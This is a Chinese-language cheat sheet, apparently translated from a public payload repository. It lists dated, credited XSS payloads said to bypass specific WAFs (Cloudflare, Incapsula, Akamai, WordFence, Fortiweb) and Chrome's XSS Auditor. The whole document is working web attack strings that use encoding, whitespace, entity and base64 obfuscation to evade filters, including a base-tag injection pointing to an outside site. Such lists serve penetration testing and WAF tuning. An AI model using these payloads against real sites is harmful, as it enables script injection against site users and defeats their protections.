# 常见WAF绕过方法

> Web应用防火墙（WAF）通过检查进出流量的模式来过滤恶意内容。尽管它们非常复杂，但WAF常常难以跟上攻击者用来混淆和修改其有效负载以规避检测的各种方法。

## 概要

* [Cloudflare](#cloudflare)
* [Chrome Auditor](#chrome-auditor)
* [Incapsula WAF](#incapsula-waf)
* [Akamai WAF](#akamai-waf)
* [WordFence WAF](#wordfence-waf)
* [Fortiweb WAF](#fortiweb-waf)

## Cloudflare

* 2021年1月25日 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)

    ```js
    <svg/onrandom=random onload=confirm(1)>
    <video onnull=null onmouseover=confirm(1)>
    ```

* 2020年4月21日 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)

    ```js
    <svg/OnLoad="`${prompt``}`">
    ```

* 2019年8月22日 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)

    ```js
    <svg/onload=%26nbsp;alert`bohdan`+
    ```

* 2019年6月5日 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)

    ```js
    1'"><img/src/onerror=.1|alert``>
    ```

* 2019年6月3日 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)

    ```js
    <svg onload=prompt%26%230000000040document.domain)>
    <svg onload=prompt%26%23x000000028;document.domain)>
    xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
    ```

* 2019年3月22日 - @RakeshMane10

    ```js
    <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
    ```

* 2018年2月27日

    ```html
    <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
    ```

## Chrome Auditor

注意：Chrome Auditor在最新版本的Chrome和Chromium浏览器中已被弃用和移除。

* 2018年8月9日

    ```javascript
    </script><svg><script>alert(1)-%26apos%3B
    ```

## Incapsula WAF

* 2019年5月11日 - [@daveysec](https://twitter.com/daveysec/status/1126999990658670593)

    ```js
    <svg onload\r\n=$.globalEval("al"+"ert()");>
    ```

* 2018年3月8日 - [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)

    ```javascript
    anythinglr00</script><script>alert(document.domain)</script>uxldz
    anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
    ```

* 2018年9月11日 - [@c0d3G33k](https://twitter.com/c0d3G33k)

    ```javascript
    <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
    ```

## Akamai WAF

* 2018年6月18日 - [@zseano](https://twitter.com/zseano)

    ```javascript
    ?"></script><base%20c%3D=href%3Dhttps:\mysite>
    ```

* 2018年10月28日 - [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480)

    ```svg
    <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
    ```

## WordFence WAF

* 2018年9月12日 - [@brutelogic](https://twitter.com/brutelogic)

    ```html
    <a href=javas&#99;ript:alert(1)>
    ```

## Fortiweb WAF

* 2019年7月9日 - [@rezaduty](https://twitter.com/rezaduty)

    ```javascript
    \u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
    ```